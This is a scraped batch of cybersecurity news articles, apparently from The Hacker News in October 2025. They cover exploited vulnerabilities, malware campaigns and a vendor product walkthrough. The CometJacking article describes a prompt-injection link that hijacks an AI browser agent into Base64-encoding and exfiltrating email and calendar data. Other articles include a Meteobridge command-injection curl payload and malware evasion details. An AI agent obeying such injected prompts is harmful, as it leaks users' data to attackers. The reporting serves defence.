Tracked as CVE-2025-27915 (CVSS score: 5.4), the vulnerability is a stored cross-site scripting (XSS) vulnerability in the Classic Web Client that arises as a result of insufficient sanitization of HTML content in ICS calendar files, resulting in arbitrary code execution.
""When a user views an e-mail message containing a malicious ICS entry, its embedded JavaScript executes via an ontoggle event inside a <details> tag,"" according to a description of the flaw in the NIST National Vulnerability Database (NVD).

""This allows an attacker to run arbitrary JavaScript within the victim's session, potentially leading to unauthorized actions such as setting e-mail filters to redirect messages to an attacker-controlled address. As a result, an attacker can perform unauthorized actions on the victim's account, including e-mail redirection and data exfiltration.""
The vulnerability was addressed by Zimbra as part of versions 9.0.0 Patch 44, 10.0.13, and 10.1.5 released on January 27, 2025. The advisory, however, makes no mention of it having been exploited in real-world attacks.
However, according to a report published by StrikeReady Labs on September 30, 2025, the observed in-the-wild activity involved unknown threat actors spoofing the Libyan Navy's Office of Protocol to target the Brazilian military using malicious ICS files that exploited the flaw.
The ICS file contained a JavaScript code that's designed to act as a comprehensive data stealer to siphon credentials, emails, contacts, and shared folders to an external server (""ffrk[.]net""). It also searches for emails in a specific folder, and adds malicious Zimbra email filter rules with the name ""Correo"" to forward the messages to spam_to_junk@proton.me.

As a way to avoid detection, the script is fashioned such that it hides certain user interface elements and detonates only if more than three days have passed since the last time it was executed.
It's currently not clear who is behind the attack, but earlier this year, ESET revealed that the Russian threat actor known as APT28 had exploited XSS vulnerabilities in various webmail solutions from Roundcube, Horde, MDaemon, and Zimbra to obtain unauthorized access.
A similar modus operandi has also been adopted by other hacking groups like Winter Vivern and UNC1151 (aka Ghostwriter) to facilitate credential theft."

The vulnerability, tracked as CVE-2025-61882 (CVSS score: 9.8), concerns an unspecified bug that could allow an unauthenticated attacker with network access via HTTP to compromise and take control of the Oracle Concurrent Processing component.
""This vulnerability is remotely exploitable without authentication, i.e., it may be exploited over a network without the need for a username and password,"" Oracle said in an advisory. ""If successfully exploited, this vulnerability may result in remote code execution.""
In a separate alert, Oracle's Chief Security Officer Rob Duhart said the company has released fixes for CVE-2025-61882 to ""provide updates against additional potential exploitation that were discovered during our investigation.""

As indicators of compromise (IoCs), the technology shared the following IP addresses and artifacts, indicating the likely involvement of the Scattered LAPSUS$ Hunters group as well in the exploit -

News of the Oracle zero-day comes days after reports emerged of a new campaign likely undertaken by the Cl0p ransomware group targeting Oracle E-Business Suite. Google-owned Mandiant described the ongoing activity as a ""high-volume email campaign"" launched from hundreds of compromised accounts.
In a post shared on LinkedIn, Charles Carmakal, CTO of Mandiant at Google Cloud, said ""Cl0p exploited multiple vulnerabilities in Oracle EBS which enabled them to steal large amounts of data from several victims in August 2025,"" adding ""multiple vulnerabilities were exploited including vulnerabilities that were patched in Oracle's July 2025 update as well as one that was patched this weekend (CVE-2025-61882).""
""Given the broad mass zero-day exploitation that has already occurred (and the n-day exploitation that will likely continue by other actors), irrespective of when the patch is applied, organizations should examine whether they were already compromised,"" Carmakal noted.

2025-10-06 11:10:45,"Oct 04, 2025",The Hacker News,https://thehackernews.com,https://thehackernews.com/2025/10/scanning-activity-on-palo-alto-networks.html,Scanning Activity on Palo Alto Networks Portals Jump 500% in One Day,"Threat intelligence firm GreyNoise disclosed on Friday that it has observed a massive spike in scanning activity targeting Palo Alto Networks login portals.
The company said it observed a nearly 500% increase in IP addresses scanning Palo Alto Networks login portals on October 3, 2025, the highest level recorded in the last three months. It described the traffic as targeted and structured, and aimed primarily at Palo Alto login portals.
As many as 1,300 unique IP addresses have participated in the effort, a significant jump from around 200 unique IP addresses observed before. Of these IP addresses, 93% are classified as suspicious and 7% as malicious.
The vast majority of the IP addresses are geolocated to the U.S., with smaller clusters detected in the U.K., the Netherlands, Canada, and Russia.

""This Palo Alto surge shares characteristics with Cisco ASA scanning occurring in the past 48 hours,"" GreyNoise noted. ""In both cases, the scanners exhibited regional clustering and fingerprinting overlap in the tooling used.""
""Both Cisco ASA and Palo Alto login scanning traffic in the past 48 hours share a dominant TLS fingerprint tied to infrastructure in the Netherlands.""
When reached for comment regarding the spike in activity, a spokesperson for the company said there are no signs of compromise.
""The security of our customers is always our top priority,"" Palo Alto Networks said. ""We have investigated the reported scanning activity and found no evidence of a compromise.""
""Palo Alto Networks is protected by our own Cortex XSIAM platform, which stops 1.5 million new attacks daily and autonomously reduces 36 billion security events into the most critical threats to ensure our infrastructure remains secure. We remain confident in our robust security posture and our ability to protect our network.""
In April 2025, GreyNoise reported a similar suspicious login scanning activity targeting Palo Alto Networks PAN-OS GlobalProtect gateways, prompting the network security company to urge customers to ensure that they are running the latest versions of the software.

The development comes as GreyNoise noted in its Early Warning Signals report back in July 2025 that surges in malicious scanning, brute-forcing, or exploit attempts are often followed by the disclosure of a new CVE affecting the same technology within six weeks.
In early September, GreyNoise warned about suspicious scans that occurred as early as late August, targeting Cisco Adaptive Security Appliance (ASA) devices. The first wave originated from over 25,100 IP addresses, mainly located in Brazil, Argentina, and the U.S.

Weeks later, Cisco disclosed two new zero-days in Cisco ASA (CVE-2025-20333 and CVE-2025-20362) that had been exploited in real-world attacks to deploy malware families like RayInitiator and LINE VIPER.
Data from the Shadowserver Foundation shows that over 45,000 Cisco ASA/FTD instances, out of which more than 20,000 are located in the U.S. and about 14,000 are located in Europe, are still susceptible to the two vulnerabilities.
(The story was updated after publication to include a response from Palo Alto Networks.)"
2025-10-06 11:10:47,"Oct 04, 2025",The Hacker News,https://thehackernews.com,https://thehackernews.com/2025/10/cometjacking-one-click-can-turn.html,CometJacking: One Click Can Turn Perplexity's Comet AI Browser Into a Data Thief,"Cybersecurity researchers have disclosed details of a new attack called CometJacking targeting Perplexity's agentic AI browser Comet by embedding malicious prompts within a seemingly innocuous link to siphon sensitive data, including from connected services, like email and calendar.
The sneaky prompt injection attack plays out in the form of a malicious link that, when clicked, triggers the unexpected behavior unbeknownst to the victims.

""CometJacking shows how a single, weaponized URL can quietly flip an AI browser from a trusted co-pilot to an insider threat,"" Michelle Levy, Head of Security Research at LayerX, said in a statement shared with The Hacker News.
""This isn't just about stealing data; it's about hijacking the agent that already has the keys. Our research proves that trivial obfuscation can bypass data exfiltration checks and pull email, calendar, and connector data off-box in one click. AI-native browsers need security-by-design for agent prompts and memory access, not just page content.""

The attack, in a nutshell, hijacks the AI assistant embedded in the browser to steal data, all while bypassing Perplexity's data protections using trivial Base64-encoding tricks. The attack does not include any credential theft component because the browser already has authorized access to Gmail, Calendar, and other connected services.
It takes place over five steps, activating when a victim clicks on a specially crafted URL, either sent in a phishing email or present in a web page. Instead of taking the user to the ""intended"" destination, the URL instructs the Comet browser's AI to execute a hidden prompt that captures the user's data from, say, Gmail, obfuscates it using Base64-encoding, and transmits the information to an endpoint under the attacker's control.

The crafted URL is a query string directed at the Comet AI browser, with the malicious instruction added using the ""collection"" parameter of the URL, causing the agent to consult its memory rather than perform a live web search.
While Perplexity has classified the findings as having ""no security impact,"" they once again highlight how AI-native tools introduce new security risks that can get around traditional defenses, allow bad actors to commandeer them to do their bidding, and expose users and organizations to potential data theft in the process.

In August 2020, Guardio Labs disclosed an attack technique dubbed Scamlexity wherein browsers like Comet could be tricked by threat actors into interacting with phishing landing pages or counterfeit e-commerce storefronts without the human user's knowledge or intervention.
""AI browsers are the next enterprise battleground,"" Or Eshed, CEO of LayerX, said. ""When an attacker can direct your assistant with a link, the browser becomes a command-and-control point inside the company perimeter. Organizations must urgently evaluate controls that detect and neutralize malicious agent prompts before these PoCs become widespread campaigns."""
2025-10-06 11:10:49,"Oct 03, 2025",The Hacker News,https://thehackernews.com,https://thehackernews.com/2025/10/detour-dog-caught-running-dns-powered.html,Detour Dog Caught Running DNS-Powered Malware Factory for Strela Stealer,"A threat actor named Detour Dog has been outed as powering campaigns distributing an information stealer known as Strela Stealer.
That's according to findings from Infoblox, which found the threat actor to maintain control of domains hosting the first stage of the stealer, a backdoor called StarFish.
The DNS threat intelligence firm said it has been tracking Detour Dog since August 2023, when GoDaddy-owned Sucuri disclosed details of attacks targeting WordPress sites to embed malicious JavaScript that used DNS TXT records as a communication channel for a traffic distribution system (TDS), redirecting site visitors to sketchy sites and malware. Traces of the threat actor date back to February 2020.
""While traditionally these redirects led to scams, the malware has evolved recently to execute remote content through the DNS-based command-and-control (C2) system,"" Infoblox said. ""We are tracking the threat actor who controls this malware as Detour Dog.""
Detour Dog-owned infrastructure, per the company, has been used to host StarFish, a simple reverse shell that serves as a conduit for Strela Stealer. In a report published in July 2025, IBM X-Force said the backdoor is delivered by means of malicious SVG files with the goal of enabling persistent access to infected machines. 
Hive0145, the threat actor exclusively behind Strela Stealer campaigns since at least 2022, is assessed to be financially motivated and is likely operating as an initial access broker (IAB), acquiring and selling access to compromised systems for profit.
Infoblox's analysis has revealed that at least 69% of the confirmed StarFish staging hosts were under the control of Detour Dog, and that a MikroTik botnet advertised as REM Proxy – which, in turn, is powered by SystemBC, as uncovered by Lumen's Black Lotus Labs last month -- was also part of the attack chain.

Specifically, it has come to light that the spam email messages that distributed Strela Stealer originated from REM Proxy and another botnet dubbed Tofsee, the latter of which has been propagated via a C++-based loader called PrivateLoader in the past. In both cases, Detour Dog infrastructure hosted the first stage of the attack.
""The botnets were contracted to deliver the spam messages, and Detour Dog was contracted to deliver the malware,"" Dr. Renée Burton, vice president of threat intelligence at Infoblox, told The Hacker News.

What's more, Detour Dog has been found to facilitate the distribution of the stealer via DNS TXT records, with the threat actor-controlled DNS name servers modified to parse specially formatted DNS queries from the compromised sites and to respond to them with remote code execution commands.
Multiple attack vectors utilize Detour Dog-controlled assets
Detour Dog's modus operandi when it comes to acquiring new infrastructure is by exploiting vulnerable WordPress sites to perform malicious code injections, although the company said the methods have since continued to evolve.
A notable aspect of the attack is that the compromised website functions normally 90% of the time, thereby raising no red flags and allowing the malware to persist for extended periods of time. In select instances (about 9%), however, a site visitor is redirected to a scam via Help TDS or Monetizer TDS; in a much rarer scenario (1%), the site receives a remote file execution command. It's believed that the redirections are limited in a bid to avoid detection.
Theorized attack chain utilizing DNS TXT records for C2
The development marks the first time Detour Dog has been spotted distributing malware, a shift from acting as an entity responsible for exclusively forwarding traffic to Los Pollos, a malicious advertising technology company operating under the VexTrio Viper umbrella. 
""We suspect that they evolved from scams to include malware distribution for financial reasons,"" Burton said. ""There has been a great deal of focus in the security industry over the last 12-18 months to stop the type of scams Detour Dog has supported in the past. We believe they were making less money, though we can't verify that.""
Complementing these changes is the fact that the website malware used by Detour Dog has witnessed an evolution of its own, gaining the ability to command infected websites to execute code from remote servers.
As of June 2025, the responses have directed the infected site to retrieve the output of PHP scripts from verified Strela Stealer C2 servers to likely distribute the malware -- suggesting the dual use of DNS as both a communication channel and a delivery mechanism.
""Responses to TXT record queries are Base64-encoded and explicitly include the word 'down' to trigger this new action,"" the company noted. ""We believe this has created a novel networked malware distribution model using DNS in which the different stages are fetched from different hosts under the threat actor's control and are relayed back when the user interacts with the campaign lure, for example, the email attachment.

""A novel setup like this would allow an attacker to hide their identity behind compromised websites, making their operations more resilient, meanwhile serving to mislead threat hunters because the malware isn't really where the analyzed attachments indicate the stage is hosted.""
The entire sequence of actions unfolds as follows -

Victim opens a malicious document, launching an SVG file that reaches out to an infected domain
The compromised site sends a TXT record request to the Detour Dog C2 server via DNS
The name server responds with a TXT record containing a Strela C2 URL, prefixed with ""down""
The compromised site removes the down prefix and uses curl to possibly fetch the StarFish downloader from the URL
The compromised site acts as a relay to send the downloader to the client (i.e., the victim)
The downloader initiates a call to another compromised domain
The second compromised domain sends a similar DNS TXT query to the Detour Dog C2 server
The Detour Dog name server responds with a new Strela C2 URL, again prefixed with ""down""
The second compromised domain strips the prefix and sends a curl request to the Strela C2 server to fetch StarFish 
The second compromised domain acts as a relay to send the malware to the client (i.e., the victim)

Infoblox said it worked with the Shadowserver Foundation to sinkhole two of Detour Dog's C2 domains (webdmonitor[.]io and aeroarrows[.]io) on July 30 and August 6, 2025.
The company also pointed out that the threat actor likely functions as a distribution-as-a-service (DaaS) provider, adding it found evidence of an ""apparently unrelated file"" propagated through its infrastructure. However, it noted it ""couldn't validate what was delivered."""
2025-10-06 11:10:51,"Oct 03, 2025",The Hacker News,https://thehackernews.com,https://thehackernews.com/2025/10/rhadamanthys-stealer-evolves-adds.html,"Rhadamanthys Stealer Evolves: Adds Device Fingerprinting, PNG Steganography Payloads","The threat actor behind Rhadamanthys has also advertised two other tools called Elysium Proxy Bot and Crypt Service on their website, even as the flagship information stealer has been updated to support the ability to collect device and web browser fingerprints, among others.
""Rhadamanthys was initially promoted through posts on cybercrime forums, but soon it became clear that the author had a more ambitious plan to connect with potential customers and build visibility,"" Check Point researcher Aleksandra ""Hasherezade"" Doniec said in a new report.
First advertised by a threat actor named kingcrete2022, Rhadamanthys has emerged as one of the most popular information stealers available under a malware-as-a-service (MaaS) model alongside Lumma, Vidar, StealC, and, more recently, Acreed. The current version of the stealer is 0.9.2.
Over the years, the stealer's capabilities have extended far beyond simple data collection, representing a comprehensive threat to personal and corporate security. In an analysis of version 0.7.0 of the malware last October, Recorded Future detailed the addition of a new artificial intelligence (AI) feature for optical character recognition (OCR) to capture cryptocurrency wallet seed phrases.
The latest findings from Check Point show that the threat actors rebranded themselves as ""RHAD security"" and ""Mythical Origin Labs,"" marketing their offerings as ""intelligent solutions for innovation and efficiency.""

Rhadamanthys is available in three tiered packages, starting from $299 per month for a self-hosted version to $499 per month that comes with additional benefits, including priority technical support, server, and advanced API access. Prospective customers can also purchase an Enterprise plan by directly contacting their sales team.
""The combination of the branding, product portfolio, and pricing structure suggest that the authors treat Rhadamanthys as a long-term business venture rather than a side project,"" Hasherezade noted. ""For defenders, this professionalization signals that Rhadamanthys with its growing customer base and an expanding ecosystem is likely here to stay, making it important to track not only its malware updates but also the business infrastructure that sustains it.""

Like Lumma version 4.0, Rhadamanthys version 0.9.2 includes a feature to avoid leaking unpacked artifacts by displaying to the user an alert that allows them to finish the execution of the malware without inflicting any harm to the machine on which it's running.

This is done so in an attempt to prevent malware distributors from spreading the initial executable in its plain, unprotected form so as to curtail detection efforts, as well as getting their systems infected in the process. That said, while the alert message may be the same in both the stealers, the implementation is completely different, Check Point said, suggesting ""surface-level mimicry.""
""In Lumma, opening and reading the file is implemented via raw syscalls, and the message box is executed via NtRaiseHardError,"" it noted. ""In Rhadamanthys, raw syscalls aren't used, and the same message box is displayed by MessageBoxW. Both loaders are obfuscated, but the obfuscation patterns are different.""
Other updates to Rhadamanthys concern slight tweaks to the custom XS format used to ship the executable modules, the checks executed to confirm if the malware should continue its execution on the host, and the obfuscated configuration embedded into it. The modifications also extend to obfuscating the names of the modules to fly under the radar.
One of the modules, previously referred to as Strategy, is responsible for a series of environment checks to ensure that it's not running in a sandboxed environment. Furthermore, it checks running processes against a list of forbidden ones, gets the current wallpaper, and verifies it against a hard-coded one that represents the Triage sandbox.
It also runs a check to confirm if the current username matches anything that resembles those used for sandboxes, and compares the machine's HWID (hardware identifier) against a predefined list, once again to ascertain the presence of a sandbox. It's only when all these checks are passed that the sample proceeds to establish a connection with a command-and-control (C2) server to fetch the core component of the stealer.
The payload is concealed using steganographic techniques, either as a WAV, JPEG, or PNG file, from where it's extracted, decrypted, and launched. It's worth noting that decrypting the package from the PNG requires a shared secret that's agreed upon during the initial phase of the C2 communication.

The stealer module, for its part, is equipped with a built-in Lua runner that serves additional plugins written in the programming language to facilitate data theft and conduct extensive device and browser fingerprinting.
""The latest variant represents an evolution rather than a revolution. Analysts should update their config parsers, monitor PNG-based payload delivery, track changes in mutex and bot ID formats, and expect further churn in obfuscation as tooling catches up,"" Check Point said.
""Currently, the development is slower and steadier: the core design remains intact, with changes focused on refinements – such as new stealer components, changes in obfuscation, and more advanced customization options."""
2025-10-06 11:10:54,"Oct 03, 2025",The Hacker News,https://thehackernews.com,https://thehackernews.com/2025/10/researchers-warn-of-self-spreading.html,Researchers Warn of Self-Spreading WhatsApp Malware Named SORVEPOTEL,"Brazilian users have emerged as the target of a new self-propagating malware that spreads via the popular messaging app WhatsApp.
The campaign, codenamed SORVEPOTEL by Trend Micro, weaponizes the trust with the platform to extend its reach across Windows systems, adding the attack is ""engineered for speed and propagation"" rather than data theft or ransomware.
""SORVEPOTEL has been observed to spread across Windows systems through convincing phishing messages with malicious ZIP file attachments,"" researchers Jeffrey Francis Bonaobra, Maristel Policarpio, Sophia Nilette Robles, Cj Arsley Mateo, Jacob Santos, and Paul John Bardon said.
""Interestingly, the phishing message that contains the malicious file attachment requires users to open it on a desktop, suggesting that threat actors might be more interested in targeting enterprises rather than consumers.""
Once the attachment is opened, the malware automatically propagates via the desktop web version of WhatsApp, ultimately causing the infected accounts to be banned for engaging in excessive spam. There are no indications that the threat actors have leveraged the access to exfiltrate data or encrypt files.
The vast majority of the infections -- 457 of the 477 cases -- are concentrated in Brazil, with entities in government, public service, manufacturing, technology, education, and construction sectors impacted the most.

The starting point of the attack is a phishing message sent from an already compromised contact on WhatsApp to lend it a veneer of credibility. The message contains a ZIP attachment that masquerades as a seemingly harmless receipt or health app-related file.
That said, there is evidence to suggest that the operators behind the campaign have also used emails to distribute the ZIP files from seemingly legitimate email addresses.

Should the recipient fall for the trick and open the attachment, they are lured into opening a Windows shortcut (LNK) file that, when launched, silently triggers the execution of a PowerShell script responsible for retrieving the main payload from an external server (e.g., sorvetenopoate[.]com).
The downloaded payload is a batch script designed to establish persistence on the host by copying itself to the Windows Startup folder so that it's automatically launched following a system start. It's also designed to run a PowerShell command that reaches out to a command-and-control (C2) server to fetch further instructions or additional malicious components.
Central to SORVEPOTEL operations is the WhatsApp-focused propagation mechanism. If the malware detects that WhatsApp Web is active on the infected system, it proceeds to distribute the malicious ZIP file to all contacts and groups associated with the victim's compromised account, allowing it to spread rapidly.
""This automated spreading results in a high volume of spam messages and frequently leads to account suspensions or bans due to violations of WhatsApp's terms of service,"" Trend Micro said.
""The SORVEPOTEL campaign demonstrates how threat actors are increasingly leveraging popular communication platforms like WhatsApp to achieve rapid, large-scale malware propagation with minimal user interaction."""
2025-10-06 11:10:56,"Oct 03, 2025",The Hacker News,https://thehackernews.com,https://thehackernews.com/2025/10/product-walkthrough-how-passwork-7.html,Product Walkthrough: How Passwork 7 Addresses Complexity of Enterprise Security,"Passwork is positioned as an on-premises unified platform for both password and secrets management, aiming to address the increasing complexity of credential storage and sharing in modern organizations. The platform recently received a major update that reworks all the core mechanics.
Passwork 7 introduces significant changes to how credentials are organized, accessed, and managed, reflecting feedback from real-world users. The redesign prioritizes usability and security, with a focus on streamlining workflows and making key features more accessible.
Passwork isn't trying to reinvent the wheel. Instead, it focuses on solving a very real problem: how do businesses keep credentials organized, secure, and accessible without adding complexity or risk? In this article, we'll look at what Passwork 7 delivers, how it fits into a business environment, and what makes it different. Below is a walkthrough of its main features and workflows.
Getting started: User experience and onboarding
The first thing you notice with Passwork 7 is its new interface that immediately signals its focus on simplicity. The dashboard provides a clear overview of vaults, folders, passwords, and recent activity. The idea is simple: streamline onboarding and avoid distracting users from their core tasks.
This approach is especially important in sectors like public service, education, and healthcare, where staff often have limited time or technical expertise. By reducing the learning curve, Passwork helps organizations roll out secure password management quickly and efficiently, without disrupting daily operations or requiring extensive user education.

Search and filtering options are simple, ensuring users can locate the right password without unnecessary complexity.
Vaults, folders, and password
Passwork 7 uses a hierarchical structure for organizing data:

Vaults are the main containers for credentials
Folders help organize related passwords within a vault
Password cards store individual credentials, including username, password, URL, notes, 2FA codes, and attachments

To add a new password, users select the appropriate vault, create a folder (if needed), and fill out a password card with the required details.

The system is flexible: organizations can build a structure or hierarchy of vaults and folders to reflect their internal company layout and security requirements. This approach allows businesses to align credential management with their own processes, whether that means mirroring a strict departmental separation or supporting cross-functional teams.
Vault types: Data segmentation
Solution introduces a flexible vault architecture designed to improve security and management. Administrators can define custom vault types that align with an organization's structure, making it easier to control data access across large teams.

There are two primary vault categories:

User vaults: Private by default, accessible only to their creator. These can be shared with others as needed.
Company vaults: Accessible to the creator and corporate administrators, who are automatically included to maintain oversight.

Beyond these standard options, administrators have the ability to set up custom vault types for specific departments or projects — such as IT, finance, or HR. For each vault type, it's possible to assign designated administrators, configure access levels, and set rules about who can create new vaults of that type. This approach ensures that department heads or IT leads maintain control over sensitive data, supports granular permission management, and simplifies auditing.
Managing access: Roles and groups
Access control in Passwork 7 is role-based. Administrators assign roles to users, defining what actions they can take within the system. There's no limit on the number of roles you can create, so it's possible to tailor permissions as granularly as needed.
You can grant specific users rights to manage certain roles and groups or access activity logs, give other administrators control over SSO and LDAP settings while blocking access to other system configurations, or create specialized departmental roles with precisely tailored permissions.
Groups further streamline permission management: by adding users to a group, they automatically inherit the group's permissions across relevant vaults and folders — such as viewing, editing, or managing credentials.

This structure helps organizations maintain security and compliance by ensuring only authorized users have access to sensitive information.

Sharing credentials: Internal and external workflows
Passwork offers several methods for sharing credentials:

Internal sharing: Credentials can be shared with individuals or groups within the organization (internal sharing system, shortcuts and access sharing). Permissions (view, edit, manage) are set per user or group.
External sharing: Time-limited, secure links can be generated to share passwords with contractors outside the organization.


All sharing activities are logged, providing a transparent audit trail for compliance and incident investigation.
Password and secrets management: DevOps-ready tools
One notable feature is Passwork's integration of secrets management and a comprehensive API. Beyond passwords, the platform stores keys, database logins, SSH keys, tokens, and certificates. Secrets can be managed alongside passwords, in dedicated encrypted vaults.
In other words, the latest release now combines two fully developed solutions under one roof:

Password manager: A user-friendly interface designed for secure storage and sharing of credentials within a team.
Secrets management system: This side caters to developers and administrators, offering programmatic access via REST API, Python connector, CLI, and Docker container. These tools make it possible to automate secret handling in scripts, services, and DevOps workflows.

The Passwork API supports all system actions, providing complete programmatic control over password and secrets management operations. This unified approach simplifies workflows for end-users, IT, and DevOps teams, reducing tool sprawl and centralizing oversight. Secrets are accessible via the web interface, API, CLI, and Python-connector, enabling integration with automated systems.
Security monitoring and incident response
Comprehensive logging now provides detailed records of every action and system change, ensuring administrators have complete visibility over the environment. Real-time tracking and instant alerts enable rapid detection of suspicious activity, supporting both security and regulatory compliance requirements. Whether monitoring access attempts, credential updates, or changes in permissions, the system delivers timely, actionable information.

Administrators have access to detailed audit logs and a security dashboard. In the event of a breach or suspicious activity, compromised users can be blocked and credentials rotated. These features support rapid incident response and ongoing risk management.
Integration with corporate systems
For enterprise environments, Passwork offers SSO and LDAP integration. Users authenticate with existing credentials, and user management synchronizes with Active Directory. This streamlines onboarding, offboarding, and ongoing access control.
Deployment
To start with, the system uses a zero-knowledge architecture — credentials aren't stored on user devices. Instead, everything, including change logs and notes, lives in a dedicated MongoDB instance and is encrypted using end-to-end AES-256. This setup keeps sensitive data out of reach, even from the platform itself. It supports both single-server and multi-server setups for those needing redundancy or fault tolerance.
For everyday use, there's a browser extension compatible with all major browsers. The mobile app is available for both Android and iOS, so users aren't tied to their desktops. There's also a dedicated 2FA app for added authentication, also supporting both platforms. 
For organizations with stricter security requirements, there's the option to switch on client-side encryption right from the start. In practice, this means every piece of data (moving or stored) is locked down using a master password unique to each user. By combining password and secrets management, Passwork can help businesses reduce their total cost of ownership.
Conclusion

2025-10-06 11:10:59,"Oct 03, 2025",The Hacker News,https://thehackernews.com,https://thehackernews.com/2025/10/new-cavalry-werewolf-attack-hits.html,"New ""Cavalry Werewolf"" Attack Hits Russian Agencies with FoalShell and StallionRAT","A threat actor that's known to share overlaps with a hacking group called YoroTrooper has been observed targeting the Russian public sector with malware families such as FoalShell and StallionRAT.
Cybersecurity vendor BI.ZONE is tracking the activity under the moniker Cavalry Werewolf. It's also assessed to have commonalities with clusters tracked as SturgeonPhisher, Silent Lynx, Comrade Saiga, ShadowSilk, and Tomiris.
""In order to gain initial access, the attackers sent out targeted phishing emails disguising them as official correspondence from Kyrgyz government officials,"" BI.ZONE said. ""The main targets of the attacks were Russian state agencies, as well as energy, mining, and manufacturing enterprises.""
In August 2025, Group-IB revealed attacks mounted by ShadowSilk targeting government entities in Central Asia and Asia-Pacific (APAC), using reverse proxy tools and remote access trojans written in Python and subsequently ported to PowerShell.

Cavalry Werewolf's ties to Tomiris are significant, not least because it further lends credence to a hypothesis that it's a Kazakhstan-affiliated threat actor. In a report late last year, Microsoft attributed the Tomiris backdoor to a Kazakhstan-based threat actor tracked as Storm-0473.
The latest phishing attacks, observed between May and August 2025, involve sending email messages using fake email addresses that impersonate Kyrgyzstan government employees to distribute RAR archives that deliver FoalShell or StallionRAT.
In at least one case, the threat actor is said to have compromised a legitimate email address associated with the Kyrgyz Republic's regulatory authority to send the messages. FoalShell is a lightweight reverse shell that appears in Go, C++, and C# versions, allowing the operators to run arbitrary commands using cmd.exe.

StallionRAT is no different in that it is written in Go, PowerShell, and Python, and enables the attackers to execute arbitrary commands, load additional files, and exfiltrate collected data using a Telegram bot. Some of the commands supported by the bot include -

/list, to receive a list of compromised hosts (DeviceID and computer name) connected to the command-and-control (C2) server
/go [DeviceID] [command], to execute the given command using Invoke-Expression
/upload [DeviceID], to upload a file to the victim's device

Also executed on the compromised hosts are tools like ReverseSocks5Agent and ReverseSocks5, as well as commands to gather device information.
The Russian cybersecurity vendor said it also uncovered various filenames in English and Arabic, suggesting that the targeting focus of Cavalry Werewolf may be broader in scope than previously assumed. 

""Cavalry Werewolf is actively experimenting with expanding its arsenal,"" BI.ZONE said. ""This highlights the importance of having quick insights into the tools used by the cluster; otherwise, it would be impossible to maintain up-to-date measures to prevent and detect such attacks.""
The disclosure comes as the company disclosed that an analysis of publications on Telegram channels or underground forums by both financially motivated attackers and hacktivists over the past year has identified compromises of at least 500 companies in Russia, most of which spanned commerce, finance, education, and entertainment sectors.
""In 86% of cases attackers published data stolen from compromised public‑facing web applications,"" it noted. ""After gaining access to the public web application, the attackers installed gs‑netcat on the compromised server to ensure persistent access. Sometimes, the attackers would load additional web shells. They also used legitimate tools such as Adminer, phpMiniAdmin, and mysqldump to extract data from databases."""
2025-10-06 11:11:00,"Oct 03, 2025",The Hacker News,https://thehackernews.com,https://thehackernews.com/2025/10/cisa-flags-meteobridge-cve-2025-4008.html,CISA Flags Meteobridge CVE-2025-4008 Flaw as Actively Exploited in the Wild,"The U.S. Cybersecurity and Infrastructure Security Agency (CISA) on Thursday added a high-severity security flaw impacting Smartbedded Meteobridge to its Known Exploited Vulnerabilities (KEV) catalog, citing evidence of active exploitation.
The vulnerability, CVE-2025-4008 (CVSS score: 8.7), is a case of command injection in the Meteobridge web interface that could result in code execution.
""Smartbedded Meteobridge contains a command injection vulnerability that could allow remote unauthenticated attackers to gain arbitrary command execution with elevated privileges (root) on affected devices,"" CISA Said.
According to ONEKEY, which discovered and reported the issue in late February 2025, the Meteobridge web interface lets an administrator manage their weather station data collection and control the system through a web application written in CGI shell scripts and C.
Specifically, the web interface exposes a ""template.cgi"" script through ""/cgi-bin/template.cgi,"" which is vulnerable to command injection stemming from the insecure use of eval calls, allowing an attacker to supply specially crafted requests to execute arbitrary code -
curl -i -u meteobridge: meteobridge \
'https://192.168.88.138/cgi-bin/template.cgi?$(id>/tmp/a)=whatever'
Furthermore, ONEKEY said the vulnerability can be exploited by unauthenticated attackers due to the fact that the CGI script is hosted in a public directory without requiring any authentication.
""Remote exploitation through a malicious webpage is also possible since it's a GET request without any kind of custom header or token parameter,"" security researcher Quentin Kaiser noted back in May. ""Just send a link to your victim and create img tags with the src set to 'https://subnet.a/public/template.cgi?templatefile=$(command).'""

There are currently no public reports referencing how CVE-2025-4008 is being exploited in the wild. The vulnerability was addressed in Meteobridge version 6.2, released on May 13, 2025.
Also added by CISA to the KEV catalog are four other flaws -

CVE-2025-21043 (CVSS score: 8.8) - Samsung mobile devices contain an out-of-bounds write vulnerability in libimagecodec.quram.so that could allow remote attackers to execute arbitrary code.
CVE-2017-1000353 (CVSS score: 9.8) - Jenkins contains a deserialization of untrusted data vulnerability that could allow unauthenticated remote code execution, bypassing denylist-based protection mechanisms.
CVE-2015-7755 (CVSS score: 9.8) - Juniper ScreenOS contains an improper authentication vulnerability that could allow unauthorized remote administrative access to the device.
CVE-2014-6278, aka Shellshock (CVSS score: 8.8) - GNU Bash contains an OS command injection vulnerability that could allow remote attackers to execute arbitrary commands via a crafted environment.

In light of active exploitation, Federal Civilian Executive Branch (FCEB) agencies are required to apply the necessary updates by October 23, 2025, for optimal protection."
2025-10-06 11:11:03,"Oct 02, 2025",The Hacker News,https://thehackernews.com,https://thehackernews.com/2025/10/confucius-hackers-hit-pakistan-with-new.html,Confucius Hackers Hit Pakistan With New WooperStealer and Anondoor Malware,"The threat actor known as Confucius has been attributed to a new phishing campaign that has targeted Pakistan with malware families like WooperStealer and Anondoor.
""Over the past decade, Confucius has repeatedly targeted government agencies, military organizations, defense contractors, and critical industries -- especially in Pakistan – using spear-phishing and malicious documents as initial access vectors,"" Fortinet FortiGuard Labs researcher Cara Lin said.
Confucius is a long-running hacking group that's believed to have been active since 2013 and operating across South Asia. Recent campaigns undertaken by the threat actor have employed a Python-based backdoor called Anondoor, signaling an evolution of the group's tradecraft and its technical agility.

One of the attack chains documented by Fortinet targeted users in Pakistan sometime in December 2024, tricking recipients into opening a .PPSX file, which then triggers the delivery of WooperStealer using DLL side-loading techniques.
A subsequent attack wave observed in March 2025 has been found to employ Windows shortcut (.LNK) files to unleash the malicious WooperStealer DLL, again launched using DLL side-loading, to steal sensitive data from compromised hosts.
Another .LNK file spotted in August 2025 also leveraged similar tactics to sideload a rogue DLL, only this time the DLL paves the way for Anondoor, a Python implant that's designed to exfiltrate device information to an external server and await further tasks to execute commands, take screenshots, enumerate files and directories, and dump passwords from Google Chrome. 

It's worth noting that the threat actor's use of Anondoor was documented in July 2025 by Seebug's KnownSec 404 Team. The progression from deploying information stealers to a backdoor is a sign that the threat actor is eyeing a pivot towards long-term monitoring and persistence.
